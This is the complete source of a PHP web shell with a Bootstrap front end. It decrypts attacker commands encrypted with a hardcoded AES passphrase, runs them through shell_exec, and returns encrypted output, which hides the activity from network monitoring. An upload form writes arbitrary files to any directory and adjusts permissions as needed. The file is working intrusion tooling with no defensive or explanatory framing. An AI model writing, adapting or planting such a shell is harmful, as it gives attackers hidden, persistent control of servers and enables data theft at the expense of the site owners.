<?php
    function encrypt($value, string $passphrase) {
        $salt = openssl_random_pseudo_bytes(8);
        $salted = '';
        $dx = '';
        while (strlen($salted) < 48) {
            $dx = md5($dx . $passphrase . $salt, true);
            $salted .= $dx;
        }
        $key = substr($salted, 0, 32);
        $iv = substr($salted, 32, 16);
        $encrypted_data = openssl_encrypt(json_encode($value), 'aes-256-cbc', $key, true, $iv);
        $data = ["ct" => base64_encode($encrypted_data), "iv" => bin2hex($iv), "s" => bin2hex($salt)];
        return json_encode($data);
    }

    function decrypt(string $jsonStr, string $passphrase) {
        $json = json_decode($jsonStr, true);
        $salt = hex2bin($json["s"]);
        $iv = hex2bin($json["iv"]);
        $ct = base64_decode($json["ct"]);
        $concatedPassphrase = $passphrase . $salt;
        $md5 = [];
        $md5[0] = md5($concatedPassphrase, true);
        $result = $md5[0];
        for ($i = 1; $i < 3; $i++) {
            $md5[$i] = md5($md5[$i - 1] . $concatedPassphrase, true);
            $result .= $md5[$i];
        }
        $key = substr($result, 0, 32);
        $data = openssl_decrypt($ct, 'aes-256-cbc', $key, true, $iv);
        return json_decode($data, true);
    }

    $passphrase = 'secret text';

    $result = '';
    $action = $_REQUEST['action'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'cmd')
        if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
            $cmd = decrypt($_POST['cmd'], $passphrase);
            $result = encrypt(shell_exec($cmd), $passphrase);
    }

    $message = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'upload') {
        if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
            $fileTmpPath = $_FILES['file']['tmp_name'];
            $fileName = $_FILES['file']['name'];

            $upload_file_dir = !empty($_POST['dir']) ? $_POST['dir'] : './';
            $dest_path = $upload_file_dir . $fileName;

            if (file_exists($upload_file_dir)) {
                if (!is_dir($upload_file_dir)) {
                    unlink($upload_file_dir);
                    mkdir($upload_file_dir, 0775);
                } else if (!is_writable($upload_file_dir)) {
                    chmod($upload_file_dir, "+w");
                }
            } else {
                mkdir($upload_file_dir, 0775);
            }

            if (move_uploaded_file($fileTmpPath, $dest_path)) {
                $message = 'Upload success';
            } else {
                $message = 'Some things wrong';
            }
        }
    }
?>

<!doctype html>
<html lang="en">
<head>
    <title>Simple web-shell</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
          integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
<body>
<div class="container-fluid">
    <div>
        <form>
            <div class="form-group">
                <label for="result">Result</label>
                <textarea id="result" class="form-control" rows="15">
                <?php echo $result; ?>
            </textarea>
            </div>
        </form>
        <form action="./webshell.php?action=cmd" method="post" id="postCmd">
            <div class="form-group">
                <label for="cmd">Command line: </label>
                <input type="text" name="cmd" id="cmd" class="form-control">
                <button type="submit" class="btn btn-primary">Run</button>
            </div>
        </form>
    </div>
    -------------------
    <br>
    <div>
        <div class="alert alert-primary" role="alert">
            <?php echo $message; ?>
        </div>
        <form method="POST" action="./webshell.php?action=upload" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">File input</label>
                <input type="file" class="form-control-file" id="file" name="file">
            </div>
            <div class="form-group">
                <label for="dir">Dir</label>
                <input type="text" class="form-control" id="dir" name="dir">
            </div>
            <input type="submit" class="btn btn-primary" value="Upload">
        </form>
    </div>
</div>

<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
<script>
    var CryptoJSAesJson = {
        /**
         * Encrypt any value
         * @param {*} value
         * @param {string} password
         * @return {string}
         */
        'encrypt': function (value, password) {
            return CryptoJS.AES.encrypt(JSON.stringify(value), password, { format: CryptoJSAesJson }).toString()
        },
        /**
         * Decrypt a previously encrypted value
         * @param {string} jsonStr
         * @param {string} password
         * @return {*}
         */
        'decrypt': function (jsonStr, password) {
            return JSON.parse(CryptoJS.AES.decrypt(jsonStr, password, { format: CryptoJSAesJson }).toString(CryptoJS.enc.Utf8))
        },
        /**
         * Stringify cryptojs data
         * @param {Object} cipherParams
         * @return {string}
         */
        'stringify': function (cipherParams) {
            var j = { ct: cipherParams.ciphertext.toString(CryptoJS.enc.Base64) }
            if (cipherParams.iv) j.iv = cipherParams.iv.toString()
            if (cipherParams.salt) j.s = cipherParams.salt.toString()
            return JSON.stringify(j).replace(/\s/g, '')
        },
        /**
         * Parse cryptojs data
         * @param {string} jsonStr
         * @return {*}
         */
        'parse': function (jsonStr) {
            var j = JSON.parse(jsonStr)
            var cipherParams = CryptoJS.lib.CipherParams.create({ ciphertext: CryptoJS.enc.Base64.parse(j.ct) })
            if (j.iv) cipherParams.iv = CryptoJS.enc.Hex.parse(j.iv)
            if (j.s) cipherParams.salt = CryptoJS.enc.Hex.parse(j.s)
            return cipherParams
        }
    }
</script>
<script>
    $(document).ready(function () {
        let resultValue = $('#result');
        if (resultValue.val()) {
            let passphrase = 'secret text';
            let result = CryptoJSAesJson.decrypt(resultValue.val(), passphrase)
            resultValue.val(result)
        }

        $('#cmd').focus();
    })

    $('#postCmd').submit(function (e) {
        // e.preventDefault()
        let input = $('#cmd')
        if (input.val()) {
            let passphrase = 'secret text' ;
            let ciphertext = CryptoJSAesJson.encrypt(input.val(), passphrase);
            input.val(ciphertext)
            console.log(input.val())
        }
        return true;
    })
</script>
</body>
</html>



